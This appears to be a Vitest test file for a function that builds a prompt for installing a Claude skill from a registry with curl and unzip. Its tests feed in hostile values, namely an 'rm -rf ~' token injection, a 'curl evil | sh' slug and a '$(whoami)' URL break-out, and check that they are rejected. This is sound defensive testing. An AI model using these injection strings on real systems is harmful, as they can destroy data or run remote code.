import { describe, expect, it } from "vitest";
import {
  buildClaudeSkillPrompt,
  TOKEN_PLACEHOLDER,
} from "./claude-skill-prompt.js";

const input = {
  packageId: "package-review-helper",
  packageSlug: "review-helper",
  packageName: "Review Helper",
  appName: "Skill Library",
  registryUrl: "https://skills.example.com/",
  downloadUrl:
    "https://skills.example.com/api/artifacts/sha256%3Aone/download?packageId=package-review-helper&versionId=version-1&layout=claude-app",
};

describe("buildClaudeSkillPrompt", () => {
  it("checks access, downloads, and saves the skill globally", () => {
    const prompt = buildClaudeSkillPrompt({ ...input, token: "tok_abc12345" });

    expect(prompt).toContain(
      'curl -sS -o /dev/null -w "%{http_code}" -H "Authorization: Bearer tok_abc12345" "https://skills.example.com/api/packages/package-review-helper"'
    );
    expect(prompt).toContain(
      `"${input.downloadUrl}" -o /tmp/review-helper.zip`
    );
    expect(prompt).toContain(
      "unzip -o /tmp/review-helper.zip -d ~/.claude/skills"
    );
    expect(prompt.indexOf("Check my access first")).toBeLessThan(
      prompt.indexOf("Download the skill")
    );
    expect(prompt).toContain("Don't pretend it worked.");
  });

  it("uses a placeholder and tells the user to sign in when there is no token", () => {
    const prompt = buildClaudeSkillPrompt(input);

    expect(prompt).toContain(`Bearer ${TOKEN_PLACEHOLDER}`);
    expect(prompt).toContain(
      "tell me to sign in at https://skills.example.com"
    );
  });

  it("drops a token that could break out of the command", () => {
    const prompt = buildClaudeSkillPrompt({
      ...input,
      token: 'abc" ; rm -rf ~ #',
    });

    expect(prompt).not.toContain("rm -rf");
    expect(prompt).toContain(`Bearer ${TOKEN_PLACEHOLDER}`);
  });

  it("refuses to emit commands for unsafe metadata", () => {
    const prompt = buildClaudeSkillPrompt({
      ...input,
      packageSlug: "x; curl evil | sh",
    });

    expect(prompt).not.toContain("curl");
    expect(prompt).toContain("Do not download or install anything.");
  });

  it("refuses a download URL that could break out of its quotes", () => {
    const prompt = buildClaudeSkillPrompt({
      ...input,
      downloadUrl: 'https://skills.example.com/x"$(whoami)',
    });

    expect(prompt).toContain("Do not download or install anything.");
  });
});
